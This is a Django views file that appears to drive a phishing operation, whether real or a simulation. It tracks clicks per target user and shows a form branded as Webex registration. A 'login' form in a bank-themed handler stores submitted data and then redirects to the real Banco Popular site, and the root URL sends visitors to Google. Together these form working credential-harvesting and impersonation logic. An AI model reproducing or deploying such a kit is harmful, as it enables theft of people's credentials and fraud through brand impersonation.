from django.http import HttpResponseRedirect
from django.shortcuts import render, redirect
from django.utils import translation
from django.views.decorators.http import require_http_methods, require_GET

from common.hit import make_hit
from handler.forms import RegistrationForm, ContactForm


def handler_none(request):
    """
    View for base site, when URL is empty
    :param request:
    :return:
    """
    return redirect('https://www.google.com', permanent=False)


@require_http_methods(['GET', 'POST'])
def handler_home(request, click_area):
    """
    Basic handler for all clicks
    :param request:
    :param click_area:
    :return:
    """
    translation.activate('es')
    request.session[translation.LANGUAGE_SESSION_KEY] = 'es'

    if request.method == 'GET':
        # Create the hit object
        hit = make_hit(request, user=request.GET.get('user'))
        hit.click_area = click_area
        hit.save()

        # Checks if is a registration form
        # Checks if is a registration form
        if click_area == 'help_':
            return HttpResponseRedirect('http://help.webex.com') 
        elif click_area == 'meet_':
            form = RegistrationForm()
        elif click_area == 'privacy_':
            return HttpResponseRedirect('https://www.webex.com/webex_privacy.html') 
        else:
            return HttpResponseRedirect('https://www.webex.com/webex_terms.html')

    elif request.method == 'POST':
        if click_area == 'aplica':
            # Populate a form
            form = RegistrationForm(request.POST)
        elif click_area == '_':
            form = RegistrationForm(request.POST)
        else:
            return render(request, 'handler/gracias.htm')

        # Validate form
        if form.is_valid():
            # Save registration data
            form.save()

            # Process and clean data
            return render(request, 'handler/gracias.htm')

    return render(request, 'handler/webex-form.html', {'form': form, 'user':request.GET.get('user')})

@require_http_methods(['GET', 'POST'])
def handler_alfresco(request, click_area):
    """
    Basic handler for all clicks
    :param request:
    :param click_area:
    :return:
    """
    translation.activate('es')
    request.session[translation.LANGUAGE_SESSION_KEY] = 'es'

    if request.method == 'GET':
        # Create the hit object
        hit = make_hit(request, user=request.GET.get('user'))
        hit.click_area = click_area
        hit.save()

        # Checks if is a registration form
        if click_area == 'cambio':
            form = ContactForm()
        elif click_area == 'cambio_':
            form = ContactForm()
        else:
            return HttpResponseRedirect('https://bancopopular.hn/')
    elif request.method == 'POST':
        if click_area == 'cambio':
            # Populate a form
            form = ContactForm(request.POST)
        elif click_area == 'cambio_':
            form = ContactForm(request.POST)
        else:
            return HttpResponseRedirect('https://bancopopular.hn/')

        # Validate form
        if form.is_valid():
            # Save registration data
            form.save()

            # Process and clean data
            return HttpResponseRedirect('https://bancopopular.hn/')

    return render(request, 'handler/login.html', {'form': form, 'user':request.GET.get('user')})


@require_GET
def handler_registered(request):
    """
    Final handler
    :param request:
    :return:
    """
    return render(request, 'handler/gracias.htm')
